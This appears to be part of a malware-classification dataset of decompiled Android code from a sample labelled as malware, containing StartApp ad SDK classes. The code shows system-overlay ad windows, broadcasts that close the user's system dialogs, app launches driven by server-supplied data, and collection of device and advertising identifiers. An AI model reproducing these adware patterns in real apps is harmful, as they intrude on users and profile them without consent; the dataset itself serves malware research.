AdapterView.OnItemClickListener(){       private void a(      String str,      String str2,      String str3,      int i2){         p.a(g.this.getContext(),str3);         Intent launchIntentForPackage=g.this.getContext().getPackageManager().getLaunchIntentForPackage(str);         if (str2 != null) {           try {             JSONObject jSONObject=new JSONObject(str2);             Iterator<String> keys=jSONObject.keys();             while (keys.hasNext()) {               String valueOf=String.valueOf(keys.next());               launchIntentForPackage.putExtra(valueOf,String.valueOf(jSONObject.get(valueOf)));             }           }  catch (          JSONException e) {             i.a(6,""Couldn't parse intent details json!"",e);           }         }         g.this.getContext().startActivity(launchIntentForPackage);         g.this.b(i2);       }       @Override public void onItemClick(      AdapterView<?> adapterView,      View view,      int i2,      long j){         g.a=true;         g.this.h=o.a(g.this.getContext());         g.this.addView(g.this.h);         String b3=((ListItem)b2.get(i2)).b();         boolean i3=((ListItem)b2.get(i2)).i();         String l=((ListItem)b2.get(i2)).l();         String k=((ListItem)b2.get(i2)).k();         int f=g.this.f();         if (l != null && !TextUtils.isEmpty(l)) {           a(l,k,b3,f);           return;         }         if (TextUtils.isEmpty(b3)) {           return;         }         if (!i3) {           Intent intent=new Intent(""android.intent.action.VIEW"",Uri.parse(b3));           intent.addFlags(344457216);           g.this.getContext().startActivity(intent);           g.this.b(f);           return;         }         g.this.g=new WebView(g.this.getContext());         g.this.g.getSettings().setJavaScriptEnabled(true);         g.this.g.setWebChromeClient(new WebChromeClient());         g.this.g.setWebViewClient(new b(f));         g.this.g.loadUrl(b3);       }     } );     this.f.a();   }   public void a(){     i.a(2,""MyWebViewClient::hide - curreent time ["" + System.currentTimeMillis() + ""]"");     try {       if (this.f != null) {         this.f.a(this.c);         a=true;         postDelayed(new Runnable(){           @Override public void run(){             g.this.f=null;             try {               g.this.b.removeView(g.this);               g.this.getContext().unregisterReceiver(g.this.e);             }  catch (            IllegalArgumentException e) {             }           }         } ,500L);       }     }  catch (    RuntimeException e) {     }     com.startapp.android.publish.e.c.a(getContext());   }   @Override public void a(  int i){     if (this.f != null) {       View childAt=this.f.getChildAt(i - this.f.getFirstItemPosition());       if (childAt == null) {         return;       }       d dVar=(d)childAt.getTag();       if (e.INSTANCE == null || e.INSTANCE.b() == null || i >= e.INSTANCE.b().size()) {         return;       }       ListItem listItem=e.INSTANCE.b().get(i);       dVar.b().setImageBitmap(e.INSTANCE.a(i,listItem.a(),listItem.f()));       dVar.b().requestLayout();       dVar.a(listItem.m());     }   }   public void b(){     a=false;     this.j=new c.a(){       @Override public void a(      int i){         if (i == 80) {           i.a(4,""onTrimMemory: ["" + i + ""]"");           g.this.a();         }       }     } ;     com.startapp.android.publish.e.c.a(getContext(),this.j);     getContext().registerReceiver(this.e,new IntentFilter(""android.intent.action.CLOSE_SYSTEM_DIALOGS""));     this.i=System.currentTimeMillis();     i.a(2,""OverlayHtml::show - startShowTime=["" + this.i + ""]"");   }   public void b(  int i){     i.a(2,""MyWebViewClient::delay hide - curreent time ["" + i + ""]"");     postDelayed(new Runnable(){       @Override public void run(){         g.this.a();       }     } ,i);   }   @Override public boolean dispatchKeyShortcutEvent(  KeyEvent keyEvent){     return super.dispatchKeyShortcutEvent(keyEvent);   }   public int getStatusBarHeight(){     int identifier=getResources().getIdentifier(""status_bar_height"",""dimen"",Values.ANDROID_PLATFORM_NAME);     if (identifier > 0) {       return getResources().getDimensionPixelSize(identifier);     }     return 0;   }   public WindowManager.LayoutParams getWmParams(){     WindowManager.LayoutParams layoutParams=new WindowManager.LayoutParams();     layoutParams.height=-1;     layoutParams.width=-1;     layoutParams.alpha=1.0f;     layoutParams.format=1;     layoutParams.type=2002;     layoutParams.flags=R.string.config_defaultBrowser;     return layoutParams;   }   @Override public boolean onKeyUp(  int i,  KeyEvent keyEvent){     return super.onKeyUp(i,keyEvent);   }   public void setAdInfoOverride(  AdInformationOverrides adInformationOverrides){     this.k=adInformationOverrides;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\List3DActivity.code","public class List3DActivity extends Activity implements f {   private c a;   private List<ListItem> d;   private int e;   private ProgressDialog b=null;   private WebView c=null;   private BroadcastReceiver f=new BroadcastReceiver(){     @Override public void onReceive(    Context context,    Intent intent){       List3DActivity.this.finish();     }   } ; private class a extends WebViewClient {     private String b;     private boolean c;     private boolean d;     private a(){       this.b="""";       this.c=false;       this.d=false;     }     private void a(){       new Thread(new Runnable(){         @Override public void run(){           try {             Thread.sleep(5000L);           }  catch (          InterruptedException e) {           }           if (a.this.c) {             return;           }           p.b(List3DActivity.this,a.this.b);           List3DActivity.this.finish();         }       } ).start();     }     @Override public void onPageFinished(    WebView webView,    String str){       i.a(2,""MyWebViewClient::onPageFinished - ["" + str + ""]"");       super.onPageFinished(webView,str);     }     @Override public void onPageStarted(    WebView webView,    String str,    Bitmap bitmap){       i.a(2,""MyWebViewClient::onPageStarted - ["" + str + ""]"");       super.onPageStarted(webView,str,bitmap);       if (this.d) {         return;       }       a();       this.d=true;     }     @Override public void onReceivedError(    WebView webView,    int i,    String str,    String str2){       i.a(2,""MyWebViewClient::onReceivedError - ["" + str + ""], [""+ str2+ ""]"");       if (List3DActivity.this.b != null) {         List3DActivity.this.b.dismiss();       }       super.onReceivedError(webView,i,str,str2);     }     @Override public boolean shouldOverrideUrlLoading(    WebView webView,    String str){       i.a(2,""MyWebViewClient::shouldOverrideUrlLoading - ["" + str + ""]"");       this.b=str;       String lowerCase=str.toLowerCase();       if (!(lowerCase.startsWith(""market"") || lowerCase.startsWith(""http://play.google.com"") || lowerCase.startsWith(""https://play.google.com""))) {         return false;       }       this.c=true;       p.b(List3DActivity.this,str);       if (List3DActivity.this.b != null) {         List3DActivity.this.b.dismiss();       }       List3DActivity.this.finish();       return true;     }   }   @Override public void a(  int i){     View childAt=this.a.getChildAt(i - this.a.getFirstItemPosition());     if (childAt == null) {       return;     }     d dVar=(d)childAt.getTag();     if (e.INSTANCE == null || e.INSTANCE.b() == null || i >= e.INSTANCE.b().size()) {       return;     }     ListItem listItem=e.INSTANCE.b().get(i);     dVar.b().setImageBitmap(e.INSTANCE.a(i,listItem.a(),listItem.f()));     dVar.b().requestLayout();     dVar.a(listItem.m());   }   @Override public void finish(){     if (this.f != null) {       unregisterReceiver(this.f);       this.f=null;     }     super.finish();   }   @Override public void onCreate(  Bundle bundle){     super.onCreate(bundle);     registerReceiver(this.f,new IntentFilter(""com.startapp.android.CloseAdActivity""));     this.e=getResources().getConfiguration().orientation;     p.a((Activity)this,true);     boolean booleanExtra=getIntent().getBooleanExtra(""overlay"",false);     requestWindowFeature(1);     int backgroundGradientTop=MetaData.INSTANCE.getBackgroundGradientTop(this);     int backgroundGradientBottom=MetaData.INSTANCE.getBackgroundGradientBottom(this);     this.a=new c(this,null);     this.a.setBackgroundDrawable(new GradientDrawable(GradientDrawable.Orientation.TOP_BOTTOM,new int[]{backgroundGradientTop,backgroundGradientBottom}));     this.d=e.INSTANCE.b();     if (this.d == null) {       finish();       return;     }     String str="""";     if (booleanExtra) {       registerReceiver(this.a.a,new IntentFilter(""com.startapp.android.Activity3DGetValues""));     }  else {       this.a.a();       this.a.setHint(true);       this.a.setFade(true);       str=""back"";     }     b bVar=new b(this,this.d,str);     e.INSTANCE.a(this,!booleanExtra);     this.a.setAdapter(bVar);     this.a.setDynamics(new SimpleDynamics(0.9f,0.6f));     this.a.setOnItemClickListener(new AdapterView.OnItemClickListener(){       private void a(      String str2,      String str3,      String str4){         p.a(List3DActivity.this,str4);         Intent launchIntentForPackage=List3DActivity.this.getPackageManager().getLaunchIntentForPackage(str2);         if (str3 != null) {           try {             JSONObject jSONObject=new JSONObject(str3);             Iterator<String> keys=jSONObject.keys();             while (keys.hasNext()) {               String valueOf=String.valueOf(keys.next());               launchIntentForPackage.putExtra(valueOf,String.valueOf(jSONObject.get(valueOf)));             }           }  catch (          JSONException e) {             i.a(6,""Couldn't parse intent details json!"",e);           }         }         List3DActivity.this.startActivity(launchIntentForPackage);         List3DActivity.this.finish();       }       @Override public void onItemClick(      AdapterView<?> adapterView,      View view,      int i,      long j){         String b=((ListItem)List3DActivity.this.d.get(i)).b();         boolean i2=((ListItem)List3DActivity.this.d.get(i)).i();         String l=((ListItem)List3DActivity.this.d.get(i)).l();         String k=((ListItem)List3DActivity.this.d.get(i)).k();         if (l != null && !TextUtils.isEmpty(l)) {           a(l,k,b);           return;         }         if (TextUtils.isEmpty(b)) {           return;         }         if (!i2) {           p.b(List3DActivity.this,b);           List3DActivity.this.finish();           return;         }         List3DActivity.this.c=new WebView(List3DActivity.this.getApplicationContext());         List3DActivity.this.c.getSettings().setJavaScriptEnabled(true);         List3DActivity.this.c.setWebChromeClient(new WebChromeClient());         List3DActivity.this.c.setWebViewClient(new a());         List3DActivity.this.c.loadUrl(b);         p.a((Activity)List3DActivity.this,true);         List3DActivity.this.b=ProgressDialog.show(List3DActivity.this,null,""Loading...."",false,false,new DialogInterface.OnCancelListener(){           @Override public void onCancel(          DialogInterface dialogInterface){             List3DActivity.this.c.stopLoading();           }         } );       }     } );     RelativeLayout relativeLayout=new RelativeLayout(this);     ViewGroup.LayoutParams layoutParams=new FrameLayout.LayoutParams(-1,-1);     ViewGroup.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-1);     LinearLayout linearLayout=new LinearLayout(this);     linearLayout.setOrientation(1);     relativeLayout.addView(linearLayout,layoutParams2);     RelativeLayout relativeLayout2=new RelativeLayout(this);     relativeLayout2.setLayoutParams(new RelativeLayout.LayoutParams(-1,-2));     relativeLayout2.setBackgroundColor(MetaData.INSTANCE.getTitleBackgroundColor(this).intValue());     linearLayout.addView(relativeLayout2);     TextView textView=new TextView(this);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);     layoutParams3.addRule(13);     textView.setLayoutParams(layoutParams3);     textView.setPadding(0,o.a(this,2),0,o.a(this,5));     textView.setTextColor(MetaData.INSTANCE.getTitleTextColor(this).intValue());     textView.setTextSize(MetaData.INSTANCE.getTitleTextSize(this).intValue());     textView.setSingleLine(true);     textView.setEllipsize(TextUtils.TruncateAt.END);     textView.setText(MetaData.INSTANCE.getTitleContent(this));     textView.setShadowLayer(2.5f,-2.0f,2.0f,-11513776);     o.a(textView,MetaData.INSTANCE.getTitleTextDecoration(this));     relativeLayout2.addView(textView);     ImageButton imageButton=new ImageButton(this,null,R.style.Theme.Translucent);     imageButton.setImageBitmap(Bitmap.createScaledBitmap(com.startapp.android.publish.e.d.a(this,""close_button.png""),o.a(this,36),o.a(this,36),true));     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(-2,-2);     layoutParams4.addRule(11);     layoutParams4.addRule(15);     imageButton.setLayoutParams(layoutParams4);     imageButton.setOnClickListener(new View.OnClickListener(){       @Override public void onClick(      View view){         List3DActivity.this.finish();       }     } );     relativeLayout2.addView(imageButton);     View view=new View(this);     view.setLayoutParams(new LinearLayout.LayoutParams(-1,o.a(this,2)));     view.setBackgroundColor(MetaData.INSTANCE.getTitleLineColor(this).intValue());     linearLayout.addView(view);     LinearLayout.LayoutParams layoutParams5=new LinearLayout.LayoutParams(-1,0);     layoutParams5.weight=1.0f;     this.a.setLayoutParams(layoutParams5);     linearLayout.addView(this.a);     LinearLayout linearLayout2=new LinearLayout(this);     LinearLayout.LayoutParams layoutParams6=new LinearLayout.LayoutParams(-1,-2);     layoutParams6.gravity=80;     linearLayout2.setLayoutParams(layoutParams6);     linearLayout2.setBackgroundColor(MetaData.INSTANCE.getPoweredByBackgroundColor(this).intValue());     linearLayout2.setGravity(17);     linearLayout.addView(linearLayout2);     TextView textView2=new TextView(this);     textView2.setTextColor(MetaData.INSTANCE.getPoweredByTextColor(this).intValue());     textView2.setPadding(0,o.a(this,2),0,o.a(this,5));     textView2.setText(""Powered By "");     textView2.setTextSize(16.0f);     linearLayout2.addView(textView2);     ImageView imageView=new ImageView(this);     imageView.setImageBitmap(com.startapp.android.publish.e.d.a(this,""logo.png""));     linearLayout2.addView(imageView);     new com.startapp.android.publish.adinformation.b(this,b.EnumC0051b.LARGE,AdPreferences.Placement.INAPP_OFFER_WALL,(AdInformationOverrides)getIntent().getParcelableExtra(""adInfoOverride"")).a(relativeLayout);     setContentView(relativeLayout,layoutParams);     new Handler().postDelayed(new Runnable(){       @Override public void run(){         List3DActivity.this.sendBroadcast(new Intent(""android.intent.action.CLOSE_SYSTEM_DIALOGS""));       }     } ,500L);   }   @Override protected void onDestroy(){     if (this.b != null) {       this.b.dismiss();     }     if (this.c != null) {       this.c.stopLoading();     }     super.onDestroy();   }   @Override protected void onPause(){     super.onPause();     if (this.e == getResources().getConfiguration().orientation) {       sendBroadcast(new Intent(""com.startapp.android.HideDisplayBroadcastListener""));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\ListItem.code","public class ListItem implements Parcelable {   public static final Parcelable.Creator<ListItem> CREATOR=new Parcelable.Creator<ListItem>(){     @Override public ListItem createFromParcel(    Parcel parcel){       return new ListItem(parcel);     }     @Override public ListItem[] newArray(    int i){       return new ListItem[i];     }   } ;   private String a;   private String b;   private String c;   private String d;   private String e;   private String f;   private float g;   private boolean h;   private Drawable i;   private String j;   private String k;   private String l;   public ListItem(  Parcel parcel){     this.a="""";     this.b="""";     this.c="""";     this.d="""";     this.e="""";     this.f="""";     this.g=0.0f;     this.h=false;     this.i=null;     this.l="""";     if (parcel.readInt() == 1) {       this.i=new BitmapDrawable((Bitmap)Bitmap.CREATOR.createFromParcel(parcel));     }  else {       this.i=null;     }     this.a=parcel.readString();     this.b=parcel.readString();     this.c=parcel.readString();     this.d=parcel.readString();     this.e=parcel.readString();     this.f=parcel.readString();     this.g=parcel.readFloat();     if (parcel.readInt() == 1) {       this.h=true;     }  else {       this.h=false;     }     this.l=parcel.readString();     this.k=parcel.readString();     this.j=parcel.readString();   }   public ListItem(  AdDetails adDetails){     this.a="""";     this.b="""";     this.c="""";     this.d="""";     this.e="""";     this.f="""";     this.g=0.0f;     this.h=false;     this.i=null;     this.l="""";     this.a=adDetails.getAdId();     this.b=adDetails.getClickUrl();     this.c=adDetails.getTrackingUrl();     this.d=adDetails.getTitle();     this.e=adDetails.getDescription();     this.f=adDetails.getImageUrl();     this.g=adDetails.getRating();     this.h=adDetails.isSmartRedirect();     this.i=null;     this.l=adDetails.getTemplate();     this.j=adDetails.getIntentDetails();     this.k=adDetails.getIntentPackageName();   }   public String a(){     return this.a;   }   public String b(){     return this.b;   }   public String c(){     return this.c;   }   public String d(){     return this.d;   }   @Override public int describeContents(){     return 0;   }   public String e(){     return this.e;   }   public String f(){     return this.f;   }   public Drawable g(){     return this.i;   }   public float h(){     return this.g;   }   public boolean i(){     return this.h;   }   public String j(){     return this.l;   }   public String k(){     return this.j;   }   public String l(){     return this.k;   }   public boolean m(){     return this.k != null;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     if (g() != null) {       parcel.writeParcelable(((BitmapDrawable)g()).getBitmap(),i);       parcel.writeInt(1);     }  else {       parcel.writeInt(0);     }     parcel.writeString(this.a);     parcel.writeString(this.b);     parcel.writeString(this.c);     parcel.writeString(this.d);     parcel.writeString(this.e);     parcel.writeString(this.f);     parcel.writeFloat(this.g);     parcel.writeInt(this.h ? 1 : 0);     parcel.writeString(this.l);     parcel.writeString(this.k);     parcel.writeString(this.j);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.list3d\SimpleDynamics.code","public class SimpleDynamics extends Dynamics implements Parcelable {   public static final Parcelable.Creator<SimpleDynamics> CREATOR=new Parcelable.Creator<SimpleDynamics>(){     @Override public SimpleDynamics createFromParcel(    Parcel parcel){       return new SimpleDynamics(parcel);     }     @Override public SimpleDynamics[] newArray(    int i){       return new SimpleDynamics[i];     }   } ;   private float f;   private float g;   public SimpleDynamics(  float f,  float f2){     this.f=f;     this.g=f2;   }   public SimpleDynamics(  Parcel parcel){     super(parcel);     this.f=parcel.readFloat();     this.g=parcel.readFloat();   }   @Override public void a(  double d){     super.a(d);   }   @Override protected void a(  int i){     this.b+=c() * this.g;     this.a+=(this.b * i) / 1000.0f;     this.b*=this.f;   }   @Override public int describeContents(){     return 0;   }   @Override public String toString(){     return super.toString() + "", Friction: ["" + this.f+ ""], Snap:[""+ this.g+ ""]"";   }   @Override public void writeToParcel(  Parcel parcel,  int i){     super.writeToParcel(parcel,i);     parcel.writeFloat(this.f);     parcel.writeFloat(this.g);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\AdDetails.code","public class AdDetails implements Parcelable, JsonDeserializer {   public static final Parcelable.Creator<AdDetails> CREATOR=new Parcelable.Creator<AdDetails>(){     @Override public AdDetails createFromParcel(    Parcel parcel){       return new AdDetails(parcel);     }     @Override public AdDetails[] newArray(    int i){       return new AdDetails[i];     }   } ;   private String adId;   private String appPresencePackage;   private String category;   private String clickUrl;   private String description;   private String imageUrl;   private String installs;   private String intentDetails;   private String intentPackageName;   private int minAppVersion;   private String packageName;   private float rating;   private boolean smartRedirect;   private String template;   private String title;   private String trackingUrl;   public AdDetails(){   }   public AdDetails(  Parcel parcel){     this.adId=parcel.readString();     this.clickUrl=parcel.readString();     this.trackingUrl=parcel.readString();     this.title=parcel.readString();     this.description=parcel.readString();     this.imageUrl=parcel.readString();     this.rating=parcel.readFloat();     int readInt=parcel.readInt();     this.smartRedirect=false;     if (readInt == 1) {       this.smartRedirect=true;     }     this.template=parcel.readString();     this.packageName=parcel.readString();     this.appPresencePackage=parcel.readString();     this.intentPackageName=parcel.readString();     this.intentDetails=parcel.readString();     this.minAppVersion=parcel.readInt();     this.installs=parcel.readString();     this.category=parcel.readString();   }   private String readNullableString(  JSONObject jSONObject,  String str){     String optString=jSONObject.optString(str,null);     if (optString.compareTo(""null"") == 0) {       return null;     }     return optString;   }   @Override public int describeContents(){     return 0;   }   @Override public void fromJson(  JSONObject jSONObject){     this.adId=jSONObject.optString(""adId"",null);     this.clickUrl=jSONObject.optString(""clickUrl"",null);     this.trackingUrl=jSONObject.optString(""trackingUrl"",null);     this.title=jSONObject.optString(""title"",null);     this.description=jSONObject.optString(""description"",null);     this.imageUrl=jSONObject.optString(""imageUrl"",null);     String optString=jSONObject.optString(""rating"",""5"");     if (optString.compareTo(""null"") == 0) {       optString=""0"";     }     this.rating=Float.valueOf(optString).floatValue();     this.smartRedirect=jSONObject.optBoolean(""smartRedirect"",false);     this.template=jSONObject.optString(""template"","""");     this.packageName=jSONObject.optString(""packageName"",null);     this.appPresencePackage=jSONObject.optString(""appPresencePackage"",null);     this.intentPackageName=readNullableString(jSONObject,""intentPackageName"");     this.intentDetails=readNullableString(jSONObject,""intentDetails"");     this.minAppVersion=jSONObject.optInt(""minAppVersion"",0);     this.category=jSONObject.optString(""category"","""");     this.installs=jSONObject.optString(""installs"","""");   }   public String getAdId(){     return this.adId;   }   public String getAppPresencePackage(){     return this.appPresencePackage;   }   public String getCategory(){     return this.category;   }   public String getClickUrl(){     return this.clickUrl;   }   public String getDescription(){     return this.description;   }   public String getImageUrl(){     return this.imageUrl;   }   public String getInstalls(){     return this.installs;   }   public String getIntentDetails(){     return this.intentDetails;   }   public String getIntentPackageName(){     return this.intentPackageName;   }   public int getMinAppVersion(){     return this.minAppVersion;   }   public String getPackageName(){     return this.packageName;   }   public float getRating(){     return this.rating;   }   public String getTemplate(){     return this.template;   }   public String getTitle(){     return this.title;   }   public String getTrackingUrl(){     return this.trackingUrl;   }   public boolean isCPE(){     return this.intentPackageName != null;   }   public boolean isSmartRedirect(){     return this.smartRedirect;   }   public void setMinAppVersion(  int i){     this.minAppVersion=i;   }   public String toString(){     return ""AdDetails [adId="" + this.adId + "", clickUrl=""+ this.clickUrl+ "", trackingUrl=""+ this.trackingUrl+ "", title=""+ this.title+ "", description=""+ this.description+ "", imageUrl=""+ this.imageUrl+ "", rating=""+ this.rating+ "", smartRedirect=""+ this.smartRedirect+ "", template=""+ this.template+ "", packageName=""+ this.packageName+ "", appPresencePackage=""+ this.appPresencePackage+ "", intentDetails=""+ this.intentDetails+ "", intentPackageName=""+ this.intentPackageName+ "", minAppVersion=""+ this.minAppVersion+ "", Installs=""+ this.installs+ "", Category=""+ this.category+ ""]"";   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeString(this.adId);     parcel.writeString(this.clickUrl);     parcel.writeString(this.trackingUrl);     parcel.writeString(this.title);     parcel.writeString(this.description);     parcel.writeString(this.imageUrl);     parcel.writeFloat(this.rating);     parcel.writeInt(this.smartRedirect ? 1 : 0);     parcel.writeString(this.template);     parcel.writeString(this.packageName);     parcel.writeString(this.appPresencePackage);     parcel.writeString(this.intentPackageName);     parcel.writeString(this.intentDetails);     parcel.writeInt(this.minAppVersion);     parcel.writeString(this.installs);     parcel.writeString(this.category);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\AdPreferences.code","public class AdPreferences implements Parcelable {   public static final Parcelable.Creator<AdPreferences> CREATOR=new Parcelable.Creator<AdPreferences>(){     @Override public AdPreferences createFromParcel(    Parcel parcel){       return new AdPreferences(parcel);     }     @Override public AdPreferences[] newArray(    int i){       return new AdPreferences[i];     }   } ;   public static final String TYPE_APP_WALL=""APP_WALL"";   public static final String TYPE_BANNER=""BANNER"";   public static final String TYPE_INAPP_EXIT=""INAPP_EXIT"";   public static final String TYPE_SCRINGO_TOOLBAR=""SCRINGO_TOOLBAR"";   public static final String TYPE_TEXT=""TEXT"";   private String adTag;   protected String advertiserId;   private int age;   private Set<String> categories;   private Set<String> categoriesExclude;   protected String country;   private String gender;   private String keywords;   private String productId;   private String publisherId;   protected String template;   private boolean testMode;   protected String type;   private boolean useSimpleToken;   public enum Placement {  INAPP_FULL_SCREEN(1),   INAPP_BANNER(2),   INAPP_OFFER_WALL(3),   INAPP_SPLASH(4),   INAPP_OVERLAY(5),   INAPP_NATIVE(6),   DEVICE_SIDEBAR(7);   private int index;   Placement(  int i){     this.index=i;   }   public static Placement getByIndex(  int i){     Placement placement=INAPP_FULL_SCREEN;     Placement[] values=values();     for (int i2=0; i2 < values.length; i2++) {       if (values[i2].getIndex() == i) {         placement=values[i2];       }     }     return placement;   }   public int getIndex(){     return this.index;   } }   public AdPreferences(){     this.country=null;     this.advertiserId=null;     this.template=null;     this.type=null;     this.publisherId=null;     this.productId=null;     this.testMode=false;     this.gender=null;     this.age=0;     this.keywords=null;     this.adTag=null;     this.categories=null;     this.categoriesExclude=null;     this.useSimpleToken=false;   }   public AdPreferences(  Parcel parcel){     this.country=null;     this.advertiserId=null;     this.template=null;     this.type=null;     this.publisherId=null;     this.productId=null;     this.testMode=false;     this.gender=null;     this.age=0;     this.keywords=null;     this.adTag=null;     this.categories=null;     this.categoriesExclude=null;     this.useSimpleToken=false;     this.country=parcel.readString();     this.advertiserId=parcel.readString();     this.publisherId=parcel.readString();     this.template=parcel.readString();     this.type=parcel.readString();     this.productId=parcel.readString();     boolean[] zArr=new boolean[1];     parcel.readBooleanArray(zArr);     this.testMode=zArr[0];     this.gender=parcel.readString();     this.age=parcel.readInt();     this.keywords=parcel.readString();     this.adTag=parcel.readString();     int readInt=parcel.readInt();     if (readInt > -1) {       String[] strArr=new String[readInt];       parcel.readStringArray(strArr);       this.categories=new HashSet();       for (      String str : strArr) {         this.categories.add(str);       }     }     if (parcel.readInt() > -1) {       String[] strArr2=new String[parcel.readInt()];       parcel.readStringArray(strArr2);       this.categoriesExclude=new HashSet();       for (      String str2 : strArr2) {         this.categoriesExclude.add(str2);       }     }   }   public AdPreferences(  AdPreferences adPreferences){     this.country=null;     this.advertiserId=null;     this.template=null;     this.type=null;     this.publisherId=null;     this.productId=null;     this.testMode=false;     this.gender=null;     this.age=0;     this.keywords=null;     this.adTag=null;     this.categories=null;     this.categoriesExclude=null;     this.useSimpleToken=false;     this.publisherId=adPreferences.publisherId;     this.productId=adPreferences.productId;     this.testMode=adPreferences.testMode;     this.gender=adPreferences.gender;     this.age=adPreferences.age;     this.keywords=adPreferences.keywords;     this.adTag=adPreferences.adTag;     this.categories=adPreferences.categories;     this.categoriesExclude=adPreferences.categoriesExclude;   }   @Deprecated public AdPreferences(  String str,  String str2){     this.country=null;     this.advertiserId=null;     this.template=null;     this.type=null;     this.publisherId=null;     this.productId=null;     this.testMode=false;     this.gender=null;     this.age=0;     this.keywords=null;     this.adTag=null;     this.categories=null;     this.categoriesExclude=null;     this.useSimpleToken=false;     this.publisherId=str;     this.productId=str2;   }   @Deprecated public AdPreferences(  String str,  String str2,  String str3){     this.country=null;     this.advertiserId=null;     this.template=null;     this.type=null;     this.publisherId=null;     this.productId=null;     this.testMode=false;     this.gender=null;     this.age=0;     this.keywords=null;     this.adTag=null;     this.categories=null;     this.categoriesExclude=null;     this.useSimpleToken=false;     this.publisherId=str;     this.productId=str2;   }   public AdPreferences addCategory(  String str){     if (this.categories == null) {       this.categories=new HashSet();     }     this.categories.add(str);     return this;   }   public AdPreferences addCategoryExclude(  String str){     if (this.categoriesExclude == null) {       this.categoriesExclude=new HashSet();     }     this.categoriesExclude.add(str);     return this;   }   @Override public int describeContents(){     return 0;   }   public String getAdTag(){     return this.adTag;   }   public int getAge(){     return this.age;   }   public Set<String> getCategories(){     return this.categories;   }   public Set<String> getCategoriesExclude(){     return this.categoriesExclude;   }   public String getGender(){     return this.gender;   }   public String getKeywords(){     return this.keywords;   }   public String getProductId(){     return this.productId;   }   public String getPublisherId(){     return this.publisherId;   }   public boolean isSimpleToken(){     return this.useSimpleToken;   }   public boolean isTestMode(){     return this.testMode;   }   public AdPreferences setAdTag(  String str){     this.adTag=str;     return this;   }   public AdPreferences setAge(  int i){     this.age=i;     return this;   }   public AdPreferences setGender(  String str){     this.gender=str;     return this;   }   public AdPreferences setKeywords(  String str){     this.keywords=str;     return this;   }   @Deprecated public void setProductId(  String str){     this.productId=str;   }   @Deprecated public void setPublisherId(  String str){     this.publisherId=str;   }   public AdPreferences setTestMode(  boolean z){     this.testMode=z;     return this;   }   public String toString(){     return ""AdPreferences [publisherId="" + this.publisherId + "", productId=""+ this.productId+ "", testMode=""+ this.testMode+ "", gender=""+ this.gender+ "", age=""+ this.age+ "", keywords=""+ this.keywords+ "", adTag=""+ this.adTag+ "", categories=""+ this.categories+ "", categoriesExclude=""+ this.categoriesExclude+ ""]"";   }   public AdPreferences useSimpleToken(  boolean z){     this.useSimpleToken=z;     return this;   }   @Override public void writeToParcel(  Parcel parcel,  int i){     parcel.writeString(this.country);     parcel.writeString(this.advertiserId);     parcel.writeString(this.publisherId);     parcel.writeString(this.template);     parcel.writeString(this.type);     parcel.writeString(this.productId);     parcel.writeBooleanArray(new boolean[]{this.testMode});     parcel.writeString(this.gender);     parcel.writeInt(this.age);     parcel.writeString(this.keywords);     parcel.writeString(this.adTag);     if (this.categories == null) {       parcel.writeInt(-1);     }  else {       parcel.writeInt(this.categories.size());       parcel.writeStringArray((String[])this.categories.toArray());     }     if (this.categoriesExclude == null) {       parcel.writeInt(-1);     }  else {       parcel.writeInt(this.categoriesExclude.size());       parcel.writeStringArray((String[])this.categoriesExclude.toArray());     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\BaseDTO.code","public abstract class BaseDTO {   public abstract String toString(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.startapp.android.publish.model\BaseRequest.code","public abstract class BaseRequest extends BaseDTO implements NameValueSerializer {   private static final String OS=""android"";   private String deviceVersion;   private int height;   private String isp;   private String manufacturer;   private String model;   private String networkType;   private String packageId;   private String productId;   private String publisherId;   private String signalLevel;   private String subProductId;   private String subPublisherId;   private Boolean unknownSourcesAllowed;   private String userAdvertisingId;   private String userId;   private int width;   private Map<String,String> parameters=new HashMap();   private String sdkVersion=b.a;   private String os=""android"";   private int sdkId=b.b;   private void setNetworkType(  Context context){     this.networkType=k.a(context);   }   private void setSignalLevel(  String str){     this.signalLevel=""e106"";     j a=j.a();     if (a != null) {       this.signalLevel=a.a(str);     }   }   public void fillApplicationDetails(  Context context,  AdPreferences adPreferences){     setPublisherId(adPreferences.getPublisherId());     setProductId(adPreferences.getProductId());     setUserId(com.startapp.android.publish.e.b.a(context));     setUserAdvertisingId(a.a(context));     setPackageId(context.getPackageName());     setManufacturer(Build.MANUFACTURER);     setModel(Build.MODEL);     setDeviceVersion(Integer.toString(Build.VERSION.SDK_INT));     setWidth(context.getResources().getDisplayMetrics().widthPixels);     setHeight(context.getResources().getDisplayMetrics().heightPixels);     setNetworkType(context);     setSignalLevel(getNetworkType());     setUnknownSourcesAllowed(Boolean.valueOf(c.b(context)));     TelephonyManager telephonyManager=(TelephonyManager)context.getSystemService(""phone"");     if (telephonyManager != null) {       setIsp(telephonyManager.getSimOperator());     }  else {       setIsp(null);     }   }   public String getDeviceVersion(){     return this.deviceVersion;   }   public int getHeight(){     return this.height;   }   public String getIsp(){     return this.isp;   }   public String getManufacturer(){     return this.manufacturer;   }   public String getModel(){     return this.model;   }   @Override public List<NameValueObject> getNameValueMap(){     ArrayList arrayList=new ArrayList();     p.a((List<NameValueObject>)arrayList,""publisherId"",this.publisherId,true);     p.a((List<NameValueObject>)arrayList,AnalyticsSQLiteHelper.TRANSACTION_PRODUCT_ID,this.productId,true);     